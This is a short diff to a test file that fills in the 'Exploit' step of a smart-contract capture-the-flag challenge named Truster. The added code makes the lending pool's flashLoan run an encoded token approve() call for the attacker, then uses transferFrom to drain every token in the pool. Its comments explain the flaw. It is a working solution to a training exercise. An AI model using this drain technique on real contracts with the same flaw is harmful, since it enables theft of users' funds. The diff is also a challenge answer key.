@@ -28,7 +28,13 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        // TrusterLenderPool blindly calls whatever contract we pass in
+        // So we just have it approve for us to take, then we take it
+        const approveI = new ethers.utils.Interface(["function approve(address sender, uint256 amount) bool"])
+        const data = approveI.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data)
+        // If deployed in a contract, this could be done in one transaction
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
